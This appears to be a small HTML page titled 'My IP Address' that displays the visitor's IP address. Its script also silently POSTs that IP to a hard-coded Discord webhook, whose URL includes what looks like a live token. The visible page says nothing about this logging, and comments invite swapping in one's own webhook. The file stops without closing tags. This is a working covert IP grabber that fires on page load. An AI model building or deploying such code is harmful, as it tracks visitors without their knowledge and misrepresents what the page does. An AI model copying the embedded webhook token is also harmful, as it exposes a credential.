<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>My IP Address</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        #ip { font-size: 24px; font-weight: bold; }
    </style>
</head>
<body>
    <h1>Your IP Address is:</h1>
    <p id="ip">Loading...</p>

    <script>
fetch('https://api64.ipify.org?format=json') // Replace with your actual API
    .then(response => response.json())
    .then(data => {
        document.getElementById('ip').textContent = data.ip;

        // Send the IP data to your webhook
        return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', { // Replace with your actual webhook URL
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ ip: data.ip })
        });
    })
    .then(response => response.text())
    .then(result => {
        console.log('Webhook response:', result);
        console.log("Script execution completed."); // Indicating script end
    })
    .catch(error => console.error('Error:', error));
